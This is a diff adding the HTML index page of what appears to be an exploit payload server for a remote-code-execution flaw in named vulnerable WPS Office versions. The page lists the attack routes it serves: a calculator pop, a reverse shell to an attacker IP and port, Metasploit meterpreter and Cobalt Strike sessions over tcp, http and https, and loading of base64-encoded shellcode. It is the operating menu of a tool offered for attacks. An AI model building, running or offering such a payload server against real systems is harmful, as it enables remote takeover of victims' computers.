@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WPS Office Rce Server</title>
+    <style>
+        /* 定义一个居中的容器 */
+        .center {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            text-align: left;
+        }
+
+        .title {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="center">
+        <div class="container">
+            <div class="title">
+                <h1>WPS Office Rce Payload Server</h1>
+                <p>WPS Office 2023 个人版 < 11.1.0.15120</p>
+                <p>WPS Office 2019 企业版 < 11.8.2.12085</p>
+            </div>
+            <div>
+                <h4>1. 弹出计算器</h4>
+                <p>/calc</p>
+                <h4>2. 反弹shell</h4>
+                <p>/shell/1.1.1.1/9000</p>
+                <h4>3. 获取meterpreter</h4>
+                <p>/msf/tcp/1.1.1.1/9000</p>
+                <p>/msf/http/1.1.1.1/80</p>
+                <p>/msf/https/1.1.1.1/443</p>
+                <h4>4. 获取CS Session</h4>
+                <p>/cs/http/1.1.1.1/80</p>
+                <p>/cs/https/1.1.1.1/443</p>
+                <h4>5. 加载shellcode</h4>
+                <p>/shellcode/base64_shellcode</p>
+                <p>shellcode进行base64处理：0xfc,0xe8......0xff,0xd5 ==> MHhmYyww......wweGQ1Cg==</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
